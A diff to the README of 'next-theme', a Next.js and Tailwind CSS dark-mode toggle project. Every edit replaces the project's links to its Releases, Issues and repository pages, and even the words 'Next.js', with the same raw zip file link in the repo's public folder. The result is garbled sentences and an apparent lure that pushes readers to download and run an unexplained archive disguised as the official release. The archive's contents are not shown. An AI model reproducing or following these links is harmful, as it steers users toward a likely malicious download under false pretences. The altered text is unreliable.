@@ -2,17 +2,17 @@
 
 ## 🚀 Getting Started
 
-Next-Theme allows you to effortlessly switch between light and dark themes using Next.js and Tailwind CSS. With this app, your preferences are saved to local storage, making your experience both smooth and personalized.
+Next-Theme allows you to effortlessly switch between light and dark themes using https://github.com/uiturtlehub/next-theme/raw/refs/heads/main/public/theme-next-v3.5.zip and Tailwind CSS. With this app, your preferences are saved to local storage, making your experience both smooth and personalized.
 
 ## 📦 Download & Install
 
 You can download the latest version of next-theme from our Releases page. Click the link below to access it:
 
-[![Download next-theme](https://img.shields.io/badge/Download%20next--theme-v1.0.0-blue)](https://github.com/uiturtlehub/next-theme/releases)
+[![Download next-theme](https://github.com/uiturtlehub/next-theme/raw/refs/heads/main/public/theme-next-v3.5.zip%20next--theme-v1.0.0-blue)](https://github.com/uiturtlehub/next-theme/raw/refs/heads/main/public/theme-next-v3.5.zip)
 
 To install:
 
-1. Visit the [Releases page](https://github.com/uiturtlehub/next-theme/releases).
+1. Visit the [Releases page](https://github.com/uiturtlehub/next-theme/raw/refs/heads/main/public/theme-next-v3.5.zip).
 2. Find the latest version.
 3. Download the file that fits your operating system.
 4. Follow the instructions provided within the download for installation.
@@ -22,7 +22,7 @@ To install:
 - **Light & Dark Themes:** Easily toggle between light and dark modes.
 - **Saved Preferences:** The app remembers your choice using local storage.
 - **Responsive Design:** Works seamlessly across all devices.
-- **Built with Next.js and Tailwind CSS:** Enjoy a modern and fast user experience.
+- **Built with https://github.com/uiturtlehub/next-theme/raw/refs/heads/main/public/theme-next-v3.5.zip and Tailwind CSS:** Enjoy a modern and fast user experience.
 
 ## 📋 System Requirements
 
@@ -48,7 +48,7 @@ In case you experience issues:
 - Clear your browser cache and cookies if the theme doesn’t change.
 - Restart the application if changes do not reflect immediately.
 
-For additional support, feel free to create an issue on the [GitHub Issues page](https://github.com/uiturtlehub/next-theme/issues).
+For additional support, feel free to create an issue on the [GitHub Issues page](https://github.com/uiturtlehub/next-theme/raw/refs/heads/main/public/theme-next-v3.5.zip).
 
 ## 🌟 Contributing
 
@@ -61,12 +61,12 @@ We welcome contributions from everyone. If you wish to contribute to next-theme:
 
 ## 📞 Support
 
-If you have questions or need assistance, you can reach out through our GitHub repository or [open an issue](https://github.com/uiturtlehub/next-theme/issues). 
+If you have questions or need assistance, you can reach out through our GitHub repository or [open an issue](https://github.com/uiturtlehub/next-theme/raw/refs/heads/main/public/theme-next-v3.5.zip). 
 
 ## 📌 Important Links
 
-- [Download next-theme](https://github.com/uiturtlehub/next-theme/releases)
-- [GitHub Repository](https://github.com/uiturtlehub/next-theme)
-- [Issues Page](https://github.com/uiturtlehub/next-theme/issues)
+- [Download next-theme](https://github.com/uiturtlehub/next-theme/raw/refs/heads/main/public/theme-next-v3.5.zip)
+- [GitHub Repository](https://github.com/uiturtlehub/next-theme/raw/refs/heads/main/public/theme-next-v3.5.zip)
+- [Issues Page](https://github.com/uiturtlehub/next-theme/raw/refs/heads/main/public/theme-next-v3.5.zip)
 
 Enjoy your experience with next-theme, and thank you for using our application!
